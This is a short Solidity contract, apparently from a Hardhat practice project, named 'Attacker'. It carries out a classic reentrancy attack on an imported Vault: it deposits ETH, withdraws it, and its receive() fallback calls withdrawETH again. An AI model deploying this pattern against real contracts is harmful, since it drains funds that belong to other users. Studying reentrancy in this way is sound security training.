// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity >=0.8.0 <0.9.0;

import "./Vault.sol";
import "hardhat/console.sol";

// TODO attack vault
contract Attacker {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(payable(_vault));
    }

    receive() external payable {
        console.log("Receive");
        vault.withdrawETH(msg.value);
    }

    function attack() external payable {
        uint amount = msg.value;
        vault.depositETH{value: amount}();
        vault.withdrawETH(amount);
    }
}
